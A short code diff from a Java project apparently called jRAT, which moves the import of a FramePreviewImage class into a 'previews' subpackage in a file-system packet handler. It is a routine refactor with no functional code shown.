@@ -3,7 +3,7 @@ package jrat.module.fs.packets;
 import jrat.common.utils.ImageUtils;
 import jrat.controller.Slave;
 import jrat.controller.packets.incoming.AbstractIncomingPacket;
-import jrat.module.fs.ui.FramePreviewImage;
+import jrat.module.fs.ui.previews.FramePreviewImage;
 
 import java.awt.image.BufferedImage;
 
